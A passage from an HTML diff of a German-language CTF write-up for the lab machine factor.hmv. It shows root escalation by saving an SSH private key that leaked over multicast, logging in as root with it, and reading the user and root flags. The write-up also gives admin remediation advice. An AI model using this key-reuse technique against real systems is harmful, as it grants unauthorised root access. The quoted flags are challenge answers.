+              <p class="recommendation">**Empfehlung (Pentester):** Den empfangenen privaten Schlüssel kopieren und in einer Datei auf der Angreifer-Maschine speichern (z.B. `id_rsa`). Die Berechtigungen der Schlüsseldatei korrekt setzen (`chmod 600 id_rsa`). Versuchen, sich mit diesem Schlüssel als `root` via SSH auf dem Zielsystem (`factor.hmv`) anzumelden (`ssh root@factor.hmv -i id_rsa`).
+              **Empfehlung (Admin):** **Sofort die Verbreitung des SSH-Schlüssels über Multicast stoppen!** Den Mechanismus, der dies tut, identifizieren und entfernen. Den kompromittierten SSH-Schlüssel auf dem Server ungültig machen (aus `authorized_keys` entfernen) und einen neuen, sicheren Schlüssel generieren. Niemals private Schlüssel über unverschlüsselte Kanäle senden.</p>
+
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">jackie@factorspace:~$ <span class="command">cd /dev/shm/</span></div>
+                      <div class="prompt">jackie@factorspace:/dev/shm$ <span class="command">nano id_rsa</span></div>
+                      <pre># (Privaten Schlüssel aus Socat-Ausgabe hier einfügen)</pre>
+                      <div class="prompt">jackie@factorspace:/dev/shm$ <span class="command">chmod 600 id_rsa</span></div>
+                      <div class="prompt">jackie@factorspace:/dev/shm$ <span class="command">ssh root@localhost -i id_rsa</span></div>
+                      <pre>
+<span class="password">Linux factorspace 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64</span>
+[...]
+Last login: Mon May  8 16:29:25 2023
+<span class="command">root@factorspace</span>:~# <span class="password"># Root-Login erfolgreich!</span>
+                      </pre>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:** Wir wechseln in das temporäre Verzeichnis `/dev/shm` auf dem Zielsystem (in der Shell als `jackie`). Wir erstellen eine Datei `id_rsa` (mit `nano` oder einem anderen Editor) und fügen den zuvor mit `socat` abgefangenen privaten SSH-Schlüssel ein. Wir setzen die Dateiberechtigungen auf `600` (nur Lesen/Schreiben für den Besitzer), was für SSH-Schlüssel erforderlich ist. Anschließend versuchen wir, uns über SSH als `root` auf `localhost` (also auf dem Zielsystem selbst) anzumelden und geben mit `-i id_rsa` den abgefangenen privaten Schlüssel an. Der Login ist <span class="password">erfolgreich</span>, und wir erhalten eine Shell als `root`.</p>
+               <p class="evaluation">**Bewertung:** Privilege Escalation zu `root` erfolgreich! Wir haben den über Multicast geleakten privaten SSH-Schlüssel genutzt, um uns direkt als Root anzumelden.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Root-Flag lesen. Bericht abschließen.
+               **Empfehlung (Admin):** Multicast-Leak beheben, SSH-Schlüssel widerrufen/ersetzen.</p>
+
+               <p class="comment">Als Root lesen wir die Flags.</p>
+               <div class="code-block">
+                   <div class="terminal">
+                        <div class="prompt">root@factorspace:~# <span class="command">ls</span></div>
+                       <pre>
+<span class="command">root.txt</span>
+                       </pre>
+                        <div class="prompt">root@factorspace:~# <span class="command">cat root.txt</span></div>
+                       <pre>
+<span class="password">052cf26a6e7e33790391c0d869e2e40c</span>
+                       </pre>
+                        <div class="prompt">root@factorspace:~# <span class="command">cat /home/jackie/user.txt</span></div>
+                       <pre>
+<span class="password">eb7d964a2a41006bb325cf822db664be</span>
+                       </pre>
+                   </div>
+               </div>
+                <p class="analysis">**Analyse:** Aus der Root-Shell lesen wir die Datei `/root/root.txt` und die Datei `/home/jackie/user.txt`.</p>
+                <p class="evaluation">**Bewertung:** Beide Flags erfolgreich erlangt. Der Penetrationstest ist abgeschlossen.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Ergebnisse dokumentieren.
+                **Empfehlung (Admin):** Alle identifizierten Schwachstellen (XPath-Injection, Klartext-Passwörter in XML/DB, unsicherer Multicast-Dienst mit SSH-Schlüssel-Leak) dringend beheben.</p>
+
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/jackie/user.txt</div>
+                    <div class="flag-value"><span class="password">eb7d964a2a41006bb325cf822db664be</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">052cf26a6e7e33790391c0d869e2e40c</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 23. Juli 2023</p> <!-- Datum aus Nmap-Scan extrahiert -->
+    </footer>
+</body>
+</html>
